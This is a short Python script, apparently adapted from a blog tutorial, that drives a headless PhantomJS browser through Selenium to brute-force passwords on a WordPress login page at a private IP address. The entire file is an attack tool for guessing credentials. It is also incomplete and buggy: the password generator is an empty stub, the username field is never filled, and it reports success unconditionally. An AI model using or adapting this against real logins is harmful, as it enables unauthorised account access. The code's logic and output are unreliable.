"""Modified version of:
https://blog.rinatussenov.com/brute-forcing-enterprise-with-python-selenium-and-phantomjs-4cb26b08bf1a"""

from selenium import webdriver
from datetime import datetime

from selenium.common.exceptions import NoSuchElementException


class BruteForcer:

    URL = "http://10.225.147.156/wp-login.php"
    charList = "abcdefghijklmnopqrstuwxkyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    passwordDictionary = []
    websiteDriver = None
    starting_time = None
    crackedPassword = None

    def __init__(self):
        self.start_time = datetime.now()
        self.websiteDriver = webdriver.PhantomJS()

    def generatePasswords(self):
        None

    def brute_force(self):
        print("Starting brute force attack...")
        self.websiteDriver.get(self.URL)

        # Iterates through the dictionary and attempts to input the results in the form of the target
        for password in self.passwordDictionary:
            if len(password) > 3:
                password_input = self.websiteDriver.find_element_by_css_selector('input[type=password]')
                password_input.send_keys(password)

                submitButton = self.websiteDriver.find_element_by_css_selector('input[type=submit]')
                submitButton.click()

                if not self.submitButtonIsPresent('input[type=submit]'):
                    self.crackedPassword = password
                    break
        print("The password was found!")

    # Checks to see if the submit button is present or not, if it is not the password has been correctly input.
    def submitButtonIsPresent(self, selector):
        try:
            self.websiteDriver.find_element_by_css_selector(selector)
        except NoSuchElementException:
            return False
        return True
